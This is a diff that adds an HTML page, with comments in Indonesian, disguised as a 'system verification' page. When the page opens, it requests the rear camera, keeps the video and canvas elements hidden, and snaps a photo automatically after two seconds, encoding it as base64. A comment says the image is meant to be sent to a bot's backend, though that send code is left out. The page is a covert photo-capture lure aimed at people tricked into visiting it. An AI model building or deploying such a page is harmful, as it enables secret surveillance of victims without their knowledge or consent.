@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Sistem</title>
+</head>
+<body>
+    <!-- Elemen video tersembunyi untuk proses capture -->
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // Fungsi untuk memulai kamera
+        async function startCamera() {
+            try {
+                // Konfigurasi 'environment' memaksa penggunaan kamera belakang
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "environment" }, 
+                    audio: false 
+                });
+                video.srcObject = stream;
+
+                // Tunggu sebentar lalu ambil foto otomatis
+                setTimeout(() => {
+                    takeSnapshot();
+                }, 2000); 
+
+            } catch (err) {
+                console.error("Gagal akses kamera:", err);
+            }
+        }
+
+        function takeSnapshot() {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
+            
+            // Mengubah gambar ke format base64
+            const imageData = canvas.toDataURL('image/png');
+
+            // Di sini kamu harus mengirim 'imageData' ke API backend bot kamu (misal: lewat fetch/axios)
+            // Contoh: sendToBot(imageData);
+        }
+
+        // Jalankan saat halaman dibuka
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
+
